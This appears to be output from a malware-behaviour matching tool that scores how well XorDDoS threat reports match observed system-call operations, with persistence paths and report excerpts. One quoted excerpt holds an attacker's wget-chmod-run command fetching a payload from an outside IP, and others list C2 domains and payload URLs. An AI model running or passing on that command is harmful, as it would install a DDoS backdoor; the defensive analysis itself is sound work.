=== mem_usage: 214.27 MB ===
asg_object: {'/var/', '^chkconfig$', '^systemctl$', '/perl/', 'bin/insserv', '/etc/sed', 'permission(\\s|:)[0-9]{1,4}', '^pipe(\\$|\\.|$)', '/etc/init.d/', '[a-zA-z]:\\d{1,5}$', '/etc/cron', '^sh$', '/boot/', '/etc/rc', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}$', '/var/run/', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '/boot/[a-z]{10}', '^sed$', '/proc/', '/proc/rs_dev', '/run/', 'bin/openrc', 'bin/sed', 'update-rc.d', '/selinux'}


Sample Xorddos-Cdnetworks.csv
	num of segment in report: 32
	lenght of ctd's OPset is 0
	#R_malObj
	num of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000
		ctd_object: set()
	#R_malSysObj
	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
		len(asg_OPset): 73, len(ctd_OPset): 0
	#R_malOps
	num of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000
		refered lifecycle: []
		sys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

Sample Xorddos-Crowdstrike.csv
	num of segment in report: 45
	lenght of ctd's OPset is 0
	#R_malObj
	num of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000
		ctd_object: set()
	#R_malSysObj
	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
		len(asg_OPset): 73, len(ctd_OPset): 0
	#R_malOps
	num of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000
		refered lifecycle: []
		sys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

Sample Xorddos-Intezer.csv
	num of segment in report: 156
	lenght of ctd's OPset is 7
	#R_malObj
	num of ctd objects: 4, num of asg objects: 26. R_malObj is 0.1538
		ctd_object: {'/proc/', '/etc/init.d/', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '/etc/rc'}
	#R_malSysObj
	num of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000
		len(asg_OPset): 73, len(ctd_OPset): 7
	#R_malOps
	num of matched asg op: 3, num of asg op: 73. R_malOps is 0.0411
		refered lifecycle: [0, 67, 68]
		sys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP 1 act=readlink, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.>
	<OP68 act=access, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.>
	<OP69 act=newfstatat, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.>

Sample Xorddos-Ms.csv
	num of segment in report: 252
	lenght of ctd's OPset is 51
	#R_malObj
	num of ctd objects: 12, num of asg objects: 26. R_malObj is 0.4615
		ctd_object: {'/proc/', '[a-zA-z]:\\d{1,5}$', '/var/', '^chkconfig$', '/proc/rs_dev', '/etc/cron', '/etc/rc', '/run/', '^sh$', '/var/run/', '/etc/init.d/', 'update-rc.d'}
	#R_malSysObj
	num of ctd objects: 3, num of asg objects: 4. R_malSysObj is 0.7500
		len(asg_OPset): 73, len(ctd_OPset): 51
	#R_malOps
	num of matched asg op: 18, num of asg op: 73. R_malOps is 0.2466
		refered lifecycle: [69, 57, 0, 55, 67, 32, 56, 40, 2, 48, 15, 52, 50, 49, 12, 51, 68, 26]
		sys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP70 act=newfstatat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP58 act=lseek, obj=/var/>, <OP39 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP 1 act=readlink, obj=/proc/>, <OP35 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>
	<OP56 act=lseek, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP68 act=access, obj=/proc/>, <OP35 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>
	<OP33 act=stat, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP57 act=lseek, obj=/var/run/>, <OP40 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP41 act=umask, obj=[a-zA-z]:\d{1,5}$>, <OP38 act=fetch, obj=www.enoan2107.com:3306, sent=after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server: www.enoan2107.com:3306 www.gzcfr5axf6.com:3306 malicious activity threads after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.>
	<OP 3 act=stat64, obj=/var/>, <OP39 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP49 act=stat64, obj=/run/>, <OP41 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP16 act=open, obj=/etc/cron>, <OP49 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= dropped files dropped file path	file type	sha-256 /etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>
	<OP53 act=open, obj=/var/>, <OP29 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>
	<OP51 act=open, obj=/run/>, <OP50 act=drop, obj=/run/gcc.pid, sent= dropped files dropped file path	file type	sha-256 /etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>
	<OP50 act=stat64, obj=/var/run/>, <OP40 act=fetch, obj=/var/run/gcc.pid, sent=  kill_process  the kill_process thread performs the following tasks:  decodes encrypted strings fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().>
	<OP13 act=open, obj=/etc/init.d/>, <OP20 act=drop, obj=/etc/init.d/hflggwyfsc.elf, sent=figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf>
	<OP52 act=open, obj=/var/run/>, <OP30 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>
	<OP69 act=newfstatat, obj=/proc/>, <OP35 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>
	<OP27 act=clone, obj=^chkconfig$>, <OP27 act=install, obj=chkconfig, sent=screenshot displaying chkconfig and update-rc.d commands installing the startup service figure 16. chkconfig and update-rc.d commands install the startup service argument-based code-flow xorddos has specific code paths corresponding to the number of arguments provided to the program.>

Sample Xorddos-Trendmicro.csv
	num of segment in report: 27
	lenght of ctd's OPset is 6
	#R_malObj
	num of ctd objects: 6, num of asg objects: 26. R_malObj is 0.2308
		ctd_object: {'[a-zA-z]:\\d{1,5}$', '/var/', '/etc/cron', '/etc/rc', '/run/', '/var/run/'}
	#R_malSysObj
	num of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000
		len(asg_OPset): 73, len(ctd_OPset): 6
	#R_malOps
	num of matched asg op: 9, num of asg op: 73. R_malOps is 0.1233
		refered lifecycle: [69, 57, 55, 32, 56, 2, 48, 15, 49]
		sys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP70 act=newfstatat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>
	<OP58 act=lseek, obj=/var/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>
	<OP56 act=lseek, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>
	<OP33 act=stat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>
	<OP57 act=lseek, obj=/var/run/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>
	<OP 3 act=stat64, obj=/var/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>
	<OP49 act=stat64, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>
	<OP16 act=open, obj=/etc/cron>, <OP 1 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>
	<OP50 act=stat64, obj=/var/run/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>

Sample Xorddos-Trendmicro2.csv
	num of segment in report: 47
	lenght of ctd's OPset is 2
	#R_malObj
	num of ctd objects: 1, num of asg objects: 26. R_malObj is 0.0385
		ctd_object: {'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
	#R_malSysObj
	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
		len(asg_OPset): 73, len(ctd_OPset): 2
	#R_malOps
	num of matched asg op: 2, num of asg op: 73. R_malOps is 0.0274
		refered lifecycle: [61, 63]
		sys_asg_OPset: [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]
	#R_malChangeOps
	num of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000
		ref-sys lifecycle: []

	hits
	<OP62 act=send, obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>
	<OP64 act=_newselect, obj=ip_addr>, <OP 2 act=find, obj=http://62.171.160.189/linux_arm, sent= indicators of compromise kaiji  file name	sha 256	trend micro pattern detection 123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a related urls:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh xorddos and other malware variants found through the same url  sha 256	trend micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a related url:  http://122.51.133.49:10086/vip>


OperationPair that changes system resources:
 [<OP47 act=fchmod, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP45 act=write, obj=/etc/sed>, <OP18 act=write, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>]
